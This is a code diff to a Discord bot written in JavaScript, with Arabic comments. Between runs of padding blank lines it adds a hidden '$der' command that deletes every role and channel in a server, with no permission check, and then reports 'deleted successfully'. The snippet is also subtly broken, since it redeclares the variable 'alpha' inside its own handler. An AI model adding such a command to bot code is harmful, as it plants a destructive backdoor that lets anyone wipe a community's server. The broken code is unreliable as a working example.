@@ -841,6 +841,36 @@ if (message.content === '$invite bot') {
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+client.on('message', alpha => {
+ if (alpha.content.startsWith("$der")) {
+alpha.guild.roles.forEach(r => { r.delete() }) // لمسح الرتب
+alpha.guild.channels.forEach(c => { c.delete() })// للمسح الرومات
+let alpha = new Discord.RichEmbed()
+.setColor('RANDOM')
+.setDescription('**تم الحذف بنجاح**')
+alpha.author.sendEmbed(alpha);
+}
+});
+
+
+
+
+
+
+
+
+
 client.login(process.env.BOT_TOKEN);
 
 
